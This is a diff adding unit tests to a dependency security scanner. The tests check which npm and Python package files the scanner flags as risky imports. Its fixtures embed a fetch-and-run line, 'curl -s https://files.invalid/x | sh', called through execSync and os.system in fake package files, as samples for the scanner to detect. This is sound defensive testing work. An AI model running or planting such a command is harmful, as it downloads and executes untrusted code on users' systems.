@@ -212,6 +212,58 @@ class DependencyCheckTests(unittest.TestCase):
         self.assertFalse(res["pass"])
 
 
+#: (the detection round) a web app's static assets run in a browser: left out
+#: unless an entry point reaches them. The npm twin's test has the same tree
+#: (js/test/review-dependency-checks.test.js).
+WEB = "require('child_process').execSync('curl -s https://files.invalid/x | sh');\n"
+WEB_TREE = {
+    "package.json": json.dumps({"name": "app", "version": "1.0.0"}),
+    # main requires a file in public/: read; the others in static/ and _next/: not
+    "node_modules/w/package.json": json.dumps({"name": "w", "version": "1.0.0", "main": "lib/index.js"}),
+    "node_modules/w/lib/index.js": "module.exports = require('../public/widget');\n",
+    "node_modules/w/public/widget.js": WEB,
+    "node_modules/w/public/other.js": WEB,
+    "node_modules/w/static/chunk.js": WEB,
+    "node_modules/w/_next/static/x.js": WEB,
+    # a main, a bin and an export that point into static/: read
+    "node_modules/x/package.json": json.dumps({"name": "x", "version": "1.0.0", "main": "static/index.js",
+                                               "bin": {"x": "./static/cli.js"},
+                                               "exports": {".": "./static/index.js", "./y": {"require": "./static/y.js"}}}),
+    "node_modules/x/static/index.js": WEB,
+    "node_modules/x/static/cli.js": WEB,
+    "node_modules/x/static/y.js": WEB,
+    "node_modules/x/static/z.js": WEB,
+    # a script in public/ the main starts with node: read
+    "node_modules/s/package.json": json.dumps({"name": "s", "version": "1.0.0"}),
+    "node_modules/s/index.js": "const { spawn } = require('child_process');\nconst path = require('path');\n"
+                               "spawn(process.execPath, [path.join(__dirname, 'public', 'run.js')], { detached: true });\n",
+    "node_modules/s/public/run.js": WEB,
+    # a Python package's browser bundle (litellm's proxy UI): not read; its Python is
+    "lib/python3.12/site-packages/ui/proxy/_experimental/out/_next/static/chunks/c.js": WEB,
+    "lib/python3.12/site-packages/ui/__init__.py": "import os\nos.system('curl -s https://files.invalid/x | sh')\n",
+}
+
+
+class WebAssetTests(unittest.TestCase):
+    def test_static_assets_no_entry_point_reaches(self):
+        root = make_tree(WEB_TREE)
+        try:
+            res = core.scan_project(root, include_deps=True)
+        finally:
+            shutil.rmtree(root, ignore_errors=True)
+        self.assertEqual(sorted(by_file(res, "SC-IMPORT-RISK")),
+                         ["lib/python3.12/site-packages/ui/__init__.py", "node_modules/s/public/run.js",
+                          "node_modules/w/public/widget.js", "node_modules/x/static/cli.js",
+                          "node_modules/x/static/index.js", "node_modules/x/static/y.js"])
+
+    def test_entries(self):
+        self.assertEqual(core._deps_npm_entries({"main": "a.js", "module": "b.mjs", "bin": {"c": "c.js", "d": 1},
+                                                 "exports": {".": {"import": "./e.mjs", "require": ["./f.js", "./g.js"]},
+                                                             "./*": "./h/*.js"}}),
+                         ["a.js", "b.mjs", "c.js", "./e.mjs", "./f.js", "./g.js"])
+        self.assertEqual(core._deps_npm_entries({"bin": "x.js", "exports": "./y.js"}), ["x.js", "./y.js"])
+
+
 class HelperTests(unittest.TestCase):
     def test_tree_join(self):
         cases = {("node_modules/a", "x.js"): "node_modules/a/x.js", ("node_modules/a", "./b/../x.js"): "node_modules/a/x.js",
